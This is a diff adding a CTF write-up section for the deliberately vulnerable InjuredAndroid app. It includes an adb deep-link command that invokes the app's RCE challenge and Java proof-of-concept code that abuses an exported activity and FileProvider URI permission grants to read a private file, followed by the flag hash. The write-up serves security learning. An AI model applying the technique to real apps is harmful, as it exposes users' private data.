@@ -1,6 +1,6 @@
 ---
 title: Injured Android 
-published: 2025-04-09
+published: 2025-04-10
 description: "My writeups for the Injured Android series"
 image: "./logo.jpeg"
 tags: ["Android", "Reverse Engineering", "CTF", "Frida", "Java"]
@@ -928,7 +928,7 @@ Try it out by just entering a `username`, and pressing on `sign up`.
 
 ### Part 3: Flutter SSL Bypass
 
-This challenge and `challenge 17` are linked. I will write the entire solution under [[#Challenge 17]].
+This challenge and `challenge 17` are linked. I will write the entire solution under [Challenge 17](#challenge-17).
 
 ## Challenge 15
 
@@ -1514,3 +1514,148 @@ Now, I would have loved to get the flag the intended way, but it won't work due 
 
 Flag :- `Epic_Awesomeness`
 
+## Challenge 18
+
+This challenge is about `file providers`. So what exactly is it? A **FileProvider** is a special Android component that lets your app securely share files with other apps using **content URIs** instead of exposing raw file paths.
+
+https://developer.android.com/reference/androidx/core/content/FileProvider
+
+`Note :- Please read the information in the above link upto summary atleast. We need those concepts to solve this challenge.`
+
+After reading about `FileProvider`, I checked the `AndroidManifest.xml`.
+
+```xml
+<activity
+            android:theme="@style/AppTheme.NoActionBar"
+            android:label="@string/title_activity_flag_eighteen"
+            android:name="b3nac.injuredandroid.FlagEighteenActivity"
+            android:exported="true"/>
+        <provider
+            android:name="androidx.core.content.FileProvider"
+            android:exported="false"
+            android:authorities="b3nac.injuredandroid.fileprovider"
+            android:grantUriPermissions="true">
+            <meta-data
+                android:name="android.support.FILE_PROVIDER_PATHS"
+                android:resource="@xml/file_paths"/>
+        </provider>
+```
+
+The information we infer from this part is :-
+- `FlagEighteenActivity` is exported.
+- authority name of the FileProvider is `b3nac.injuredandroid.fileprovider` - We need this to frame our intent to be send to the `injuredAndroid apk`. (Read the previous link to know about this)
+- `android:grantUriPermissions="true"` This means that an exported activity can interact with this FileProvider via intents that have the correct uri according to `file_paths.xml`
+
+We will check `file_paths.xml`
+
+```xml
+<?xml version="1.0" encoding="utf-8"?>
+<paths xmlns:android="http://schemas.android.com/apk/res/android">
+    <files-path
+        name="files"
+        path="/"/>
+</paths>
+```
+
+So based on the path which has been specified, we can conclude that the path is `/data/data/b3nac.injuredandroid/files`. Basically the return value of [Context.getFilesDir()](https://developer.android.com/reference/android/content/Context.html#getFilesDir\(\)).
+
+Normally that path is not accessible via adb if the phone is not rooted, but as my emulator is rooted, I went and checked the directory, just for it to be empty. Then based on the hints, the author is asking to use `another activity`. Remember that in the [RCE challenge](#challenge-13) the files in a certain directory were being copied to the `/data/data/b3nac.injuredandroid/files` directory.
+
+I won't be using the `html` to do that again. Instead will do the same thing via `abd`.
+
+`adb shell am start -a android.intent.action.VIEW -d "flag13://rce?binary=narnia.x86_64&param=testOne"`
+
+This is copy the files in `assets` but not in `flutter asstes` in the previously mentioned directory.
+
+`Disclaimer :- The flag is a hash according to the hints. Now which file's hash and what hash type was the question. It's via trial and error I figured out that the file name is "test" and the hash type is MD5. Also "test" was the only file which was not an ELF.`
+
+Now we need to write an app to read the content. Sending the intent, granting permissions for reading and starting the activity could have been done via `adb` but reading the file was the issue and thus we need to make another app for this.
+
+Things to be done in the app:-
+- Create the intent
+- Create the File Provider uri.
+- Grant uri permissions.
+- Set the exported class activity as it will be the one calling the `fileprovider`
+- Get the result of the uri call.
+
+```java
+File imagePath = new File(this.getFilesDir(), "/");  
+        File newFile = new File(imagePath, "test");  
+//        Log.d("aa", newFile.toString());  
+        Uri contentUri = getUriForFile(this, "b3nac.injuredandroid.fileprovider", newFile);
+```
+
+This will create out content uri and will look like this :- 
+`content://b3nac.injuredandroid.fileprovider/files/test`
+
+Then I need to create the intent and set the flags required on it for the read permission.
+
+```java
+Intent intent = new Intent();
+        intent.setData(contentUri);
+        intent.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
+        intent.setClassName("b3nac.injuredandroid", "b3nac.injuredandroid.FlagEighteenActivity");
+```
+
+We are making a new intent, setting the uri, the flags, and the class to be invoked via the app. The docs for the same can be found in the previous link about `FileProvider`.
+
+After this, figuring out how to send an Intent and receive a result back at the same time and how to access what I need to access, took a while. Well `stackoverflow` and `android docs` exist. Here are all the links that I followed:-
+- https://developer.android.com/training/basics/intents/result
+- https://stackoverflow.com/questions/62671106/onactivityresult-method-is-deprecated-what-is-the-alternative
+- https://stackoverflow.com/questions/31069556/android-read-text-file-from-uri
+- https://developer.android.com/reference/android/content/ContentResolver
+- https://docs.oracle.com/javase/8/docs/api/java/util/Objects.html
+
+This is what this part looks like:- 
+```java
+ActivityResultLauncher<Intent> mStartForResult = registerForActivityResult(new ActivityResultContracts.StartActivityForResult(),
+                new ActivityResultCallback<ActivityResult>() {
+                    @Override
+                    public void onActivityResult(ActivityResult result) {
+                        if (result.getResultCode() == Activity.RESULT_OK) {
+                            Intent intent = result.getData();
+                            // Handle the Intent
+                            Uri uri = intent.getData();
+                            try {
+                                InputStream in = getContentResolver().openInputStream(uri);
+                                BufferedReader r = new BufferedReader(new InputStreamReader(in));
+                                StringBuilder total = new StringBuilder();
+                                for (String line; (line = r.readLine()) != null; ) {
+                                    total.append(line).append('\n');
+                                }
+
+                                String content = total.toString();
+                                Log.d("Content", content);
+
+
+                            }catch (Exception e) {
+                            }
+                        }
+                    }
+                });
+
+        mStartForResult.launch(intent);
+```
+
+What we are doing above is registering a **callback** to handle the result of launching an activity (using the modern `ActivityResultLauncher` API) — and then launching an intent to get a file's contents from a `content://` URI.
+
+The code I have used for the `callback` is standard code available in the docs.
+
+So after we combine all these and launch the app on the same device as `InjuredAndroid`, the `FlagEighteenActivity` will open, and then we need to **manually close or background that activity**, because:
+
+1. **Our PoC app launches `FlagEighteenActivity`** in InjuredAndroid using an intent with a `content://` URI.    
+2. `FlagEighteenActivity` runs and finishes — it sets a result back to our app with `setResult(...)`.    
+3. That result includes the **same `content://` URI**, now with permission granted (thanks to `FLAG_GRANT_READ_URI_PERMISSION`).    
+4. Once the activity is closed (manually or programmatically), **our PoC app's callback (`onActivityResult`) triggers**.    
+5. Our app now reads the file via `ContentResolver.openInputStream(uri)` and logs or displays the contents of the file.
+
+If we don't close `FlagEighteenActivity` manually then our app is **waiting for a result**, but `onActivityResult()` won't fire until the called activity finishes. So we will be stuck waiting.
+
+![level_17_output](./Images/output_17.png)
+
+We can see the output of the file `test`.
+
+Now as I previously mentioned, by trial-and-error, I figured out that `MD5` was the hash type.
+
+Therefore,
+`Flag`:- `034d361a5942e67697d17534f37ed5a9`
